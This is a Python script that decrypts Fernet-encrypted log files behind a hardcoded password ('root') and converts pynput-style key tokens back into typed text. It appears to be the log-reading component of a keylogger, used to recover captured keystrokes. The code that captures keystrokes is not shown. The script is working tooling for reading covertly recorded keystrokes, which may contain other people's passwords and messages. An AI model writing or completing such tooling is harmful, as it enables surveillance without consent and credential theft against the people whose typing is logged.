from cryptography.fernet import Fernet
import base64
import os
import getpass

# === Load encryption key ===
def load_encryption_key():
    with open("protected_key.key", "rb") as key_file:
        return key_file.read()

# === Clean log text ===
def clean_log(text):
    replacements = {
        '[Key.space]': ' ',
        '[Key.enter]': '\n',
        '[Key.tab]': '\t',
    }
    for key, value in replacements.items():
        text = text.replace(key, value)
    
    # Handle backspace manually
    while '[Key.backspace]' in text:
        index = text.find('[Key.backspace]')
        if index > 0:
            text = text[:index-1] + text[index+len('[Key.backspace]'):]
        else:
            text = text[index+len('[Key.backspace]'):]
    
    return text

# === Decrypt log file ===
def decrypt_log_file(file_path):
    print(f"[*] Decrypting file: {file_path}")
    try:
        with open(file_path, "rb") as encrypted_file:
            lines = encrypted_file.readlines()
            for encrypted_line in lines:
                decrypted = fernet.decrypt(encrypted_line.strip()).decode()
                cleaned = clean_log(decrypted)
                print("Decrypted:", cleaned)
    except Exception as e:
        print(f"[!] Decryption error: {e}")

# === Main Execution ===
if __name__ == "__main__":
    # Password protection
    password = getpass.getpass("Enter decryption password: ")
    correct_password = "root"  # Change this to your secret
    if password != correct_password:
        print("[!] Incorrect password. Access denied.")
        exit()

    # Load key and decrypt logs
    fernet = Fernet(load_encryption_key())
    log_folder = "logs"
    
    # Decrypt all .txt files in logs folder
    for filename in os.listdir(log_folder):
        if filename.endswith(".txt"):
            file_path = os.path.join(log_folder, filename)
            decrypt_log_file(file_path)
